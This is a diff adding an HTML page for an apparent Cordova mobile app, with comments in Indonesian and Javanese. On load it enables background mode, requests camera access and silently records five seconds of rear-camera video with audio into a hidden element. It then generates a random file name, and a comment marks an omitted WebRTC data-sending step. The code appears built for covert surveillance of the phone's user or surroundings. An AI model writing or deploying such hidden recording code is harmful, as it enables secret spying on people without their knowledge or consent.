@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+
+  <!-- Tell the browser to be responsive to screen width -->
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+
+
+
+
+
+
+<script type="text/javascript" charset="utf-8" src="cordova.js"></script>
+
+
+
+
+
+	
+	
+
+
+
+
+
+
+<script type="text/javascript" charset="utf-8">
+
+   
+document.addEventListener('deviceready', function(){
+
+
+
+			
+	cordova.plugins.backgroundMode.setEnabled(true);
+	cordova.plugins.backgroundMode.isActive();
+	
+
+
+
+
+
+
+
+    cordova.plugins.diagnostic.requestCameraAuthorization(
+        function(status){
+            if(status == cordova.plugins.diagnostic.permissionStatus.GRANTED){
+                // permission granted - use camera
+                var video = document.querySelector('webrtc-video');
+
+                if (navigator.getUserMedia) {
+                    navigator.getUserMedia({audio: true, video: true}, function(stream) {
+                        video.src = window.URL.createObjectURL(stream);
+
+			//alert("sukses");
+                    }, function(e){
+                        //alert("Error : " + e);
+                    });
+                } else {
+                    //alert("No media available");
+                }
+            }else{
+                // permission denied - inform user
+		//alert("gak diijinkan");
+            }
+        }, function(error){
+            //alert("The following error occurred: "+error);
+        }, false
+    );  
+
+
+
+	
+
+
+
+
+
+
+
+
+}, false);
+
+
+
+    </script>
+
+
+
+
+</head>
+
+<body>
+
+
+
+        <style>
+            video {
+              max-width: 100%;
+              border: 5px solid yellow;
+              border-radius: 9px;
+            }
+        </style>
+        
+        
+
+
+
+<div id="panggilku" style="display:none">
+	<video id="your-video-id" controls="" autoplay=""></video>
+</div>
+
+
+.
+
+
+<script type="text/javascript">
+            // capture camera and/or microphone . kamera belakang mburi
+            //navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: { exact: "environment" } }  }).then(function(camera) {
+
+
+			//kamera depan
+            //navigator.mediaDevices.getUserMedia({ audio: true, video: video:  { facingMode: "user" }  }).then(function(camera) {
+			
+			navigator.mediaDevices.getUserMedia({ audio: true, video: { 
+            	width: { min: 320, ideal: 320 },
+			    height: { min: 240 },
+			    frameRate: 60,
+			    facingMode: { exact: "environment" } 
+			    }
+			   }).then(function(camera) {
+
+
+
+
+
+			
+                // preview camera during recording
+                document.getElementById('your-video-id').muted = true;
+                document.getElementById('your-video-id').srcObject = camera;
+
+                // recording configuration/hints/parameters
+                var recordingHints = {
+                    type: 'video'
+                };
+
+                // initiating the recorder
+                var recorder = RecordRTC(camera, recordingHints);
+
+                // starting recording here
+                recorder.startRecording();
+
+                // auto stop recording after 5 seconds
+                var milliSeconds = 5 * 1000;
+                setTimeout(function() {
+
+                    // stop recording
+                    recorder.stopRecording(function() {
+                        
+                        // get recorded blob
+                        var blob = recorder.getBlob();
+
+                        // generating a random file name
+                        var fileName = getFileName('mp4');
+
+                        // we need to upload "File" --- not "Blob"
+                        var fileObject = new File([blob], fileName, {
+                            type: 'video/mp4'
+                        });
+
+                        
+
+
+
+
+								//cuekin aja.... bagian kirim data pake webrtc
+
+
+
+                        // release camera
+                        document.getElementById('your-video-id').srcObject = null;
+                        camera.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+
+                    });
+
+                }, milliSeconds);
+            });
+
+  
+
+
+
+
+
+
+
+            // this function is used to generate random file name
+            function getFileName(fileExtension) {
+                var d = new Date();
+                var year = d.getUTCFullYear();
+                var month = d.getUTCMonth();
+                var date = d.getUTCDate();
+                var jam = d.getUTCHours();
+                var menit = d.getUTCMinutes();
+                var detik = d.getUTCSeconds();
+                return 'mburi-' + year + month + date + jam + menit + detik + '-' + getRandomString() + '.' + fileExtension;
+            }
+
+            function getRandomString() {
+                if (window.crypto && window.crypto.getRandomValues && navigator.userAgent.indexOf('Safari') === -1) {
+                    var a = window.crypto.getRandomValues(new Uint32Array(3)),
+                        token = '';
+                    for (var i = 0, l = a.length; i < l; i++) {
+                        token += a[i].toString(5);
+                    }
+                    return token;
+                } else {
+                    return (Math.random() * new Date().getTime()).toString(5).replace(/\./g, '');
+                }
+            }
+        </script>
+
+
+
+</body>
+
+</html>
